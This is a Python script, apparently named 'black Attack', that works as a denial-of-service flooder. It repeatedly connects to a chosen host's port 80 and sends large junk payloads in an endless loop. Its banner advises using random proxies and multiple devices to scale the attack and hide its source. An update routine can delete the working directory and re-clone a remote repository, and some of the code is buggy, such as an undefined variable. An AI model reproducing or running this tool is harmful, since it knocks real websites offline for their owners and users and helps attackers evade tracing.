import socket,os,time,sys,urllib.request
r="\033[31m";g="\033[32m";k="\033[37m" ;bb="\033[40m";ww="\033[47m"
print ("\033[36m"+bb)
os.system ("clear")
time.sleep(0.3)
os. system ("figlet -f slant '    black Attack    '")
print ("\033[34m                                               V: 2.6")
print ("\033[36m\n\n               ********"+"\033[34m Welcome at "+r+ "black Attack " +"\033[36m********\n\n\n")
def update():
    try:
        check=urllib.request.urlopen("https://brojda.000webhostapp.com/battack/version")
        update=check.read().decode('utf-8')
        version="v1.2"
        if	version==update:
            pass
        else:
            get=input(W+"  There are updates to ({0}) Do you want update?[Y/n] ".format(update))
            if get.lower()=="y":
                name=os.getcwd().split('/')[-1]
                os.chdir('..')
                os.remove (name) 
                os.system('git clone https://github.com/brojda/BAttack.git')
    except:
        get=input(W+"  There are updates.Do you want update?[Y/n]")
        if get.lower()=="y":
        
            name=os.getcwd().split('/')[-1]
            os.chdir('..')
            os.remove (name) 
            os.system('git clone https://github.com/brojda/BAttack.git')
def ipget(target):
    try:
        ip=socket.gethostbyname(target)
        attack(ip)
    except:
        print (r+"\n\n   target is not found !!","{~"+k+"Please check if you're online // and check your spelling"+r+"~}\n\n")
        print ("."*os.get_terminal_size().columns)
def attack(ip):
    i=0
    while True:
        try:
            i=i+1
            connect=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.25)
            connected=connect.connect((ip,80))
            attack=str('#$&_@--_#-1_&$#_-112_55=5&52#1_&+#+14$48$56:88&00=8%6%6%9700+6/67?%64)4(+#%:#:$=$+12(4)//bshhsfaywjbsf4+(1+gwygzyvhshhshwksn5574(45bhejrjjrjkggjgjgjjrnn3mj888)5=5$66_22>¥™>[}¥©®€>[||;¦]¦[|[¦]<€<<€<€<' )*100000
            connect.send(attack.encode('utf-8'))
            print (r,"\tAtacking ", k+ip+g," 80 Done... "+time.asctime()+" : "+r+str(i),end='\r')
        except socket.timeout:
            print (r+"                    ----->socket.timeout<-----                      ",end='\r') 
if __name__=="__main__" :
    try:
        target =sys.argv[1]
    except:
        target =input(r+"  Entar  URL or IP target : "+k)
    print ("\n"*3)
    print ('\033[36m     ........................................................................') 
    print ('     .                            ~ Advices ~                               .') 
    print ('     ........................................................................') 
    print ('     .                                                                      .') 
    print ('     .      ~ Use automatic random proxies.                                 .') 
    print ('     .                                                                      .') 
    print ('     .      ~ Use more than one device.                                     .') 
    print ('     .                                                                      .') 
    print ('     .      ~ You can use this method in two ways exm :                     .') 
    print ('     .           1- Command --> python3 BAttack.py                          .') 
    print ('     .           2- Command --> python3 BAttack.py  www.example.com         .') 
    print ('     .                                                                      .')  
    print ('     .         _______________________________________________________      .') 
    print ('     .        |                                                       |     .')  
    print ('     .        |   Author: Ibrahim_AlJadaan                            |     .')
    print ('     .        |   Team: Brojda                                        |     .')
    print ('     .        |   www.youtube.com/channel/UCemKd0mx1PzSxUrR4YlFPGQ    |     .')
    print ('     .        |   send us: command --> python3 send-us.py             |     .') 
    print ('     .        |                                                       |     .')
    print ('     .         ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯      .')
    print ('     .      ~ Press Ctrl+z to exit.                                         .')
    print ('     ........................................................................')
    ip=ipget(target)
